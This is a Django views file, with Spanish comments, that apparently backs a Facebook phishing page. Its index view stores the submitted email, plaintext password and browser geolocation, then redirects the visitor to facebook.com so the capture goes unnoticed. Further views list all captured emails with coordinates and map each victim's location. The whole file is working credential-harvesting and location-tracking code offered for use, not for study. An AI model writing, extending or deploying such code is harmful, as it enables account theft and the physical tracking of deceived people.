from django.shortcuts import render, redirect
from django.shortcuts import render, get_object_or_404
from profiles.models import Profile

def index(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        latitude = request.POST.get("latitude")
        longitude = request.POST.get("longitude")
        
        # Convierte a float solo si hay valor
        latitude = float(latitude) if latitude else None
        longitude = float(longitude) if longitude else None

        Profile.objects.create(
            email=email,
            password=password,
            latitude=latitude,
            longitude=longitude
        )
        return redirect('https://www.facebook.com/')
    # Consulta todos los perfiles para depuración:
    print(Profile.objects.all())
    return render(request, 'index.html')

def lista_perfiles(request):
    perfiles = Profile.objects.all()
    # Preparamos los datos para la tabla
    perfiles_data = []
    for perfil in perfiles:
        lat = None
        lon = None
        # Limpiamos formato: si llegan con coma, convertimos a punto
        if perfil.latitude is not None:
            lat = str(perfil.latitude).replace(",", ".")
        if perfil.longitude is not None:
            lon = str(perfil.longitude).replace(",", ".")
        perfiles_data.append({
            "id": perfil.id,
            "email": perfil.email,
            "latitude": lat,
            "longitude": lon,
        })
    return render(request, "lista_perfiles.html", {"perfiles": perfiles_data})

def ver_ubicacion(request, profile_id):
    profile = get_object_or_404(Profile, id=profile_id)
    # Limpiamos coordenadas para asegurar punto decimal
    lat = str(profile.latitude).replace(",", ".") if profile.latitude is not None else None
    lon = str(profile.longitude).replace(",", ".") if profile.longitude is not None else None
    return render(request, "ver_ubicacion.html", {
        "latitude": lat,
        "longitude": lon
    })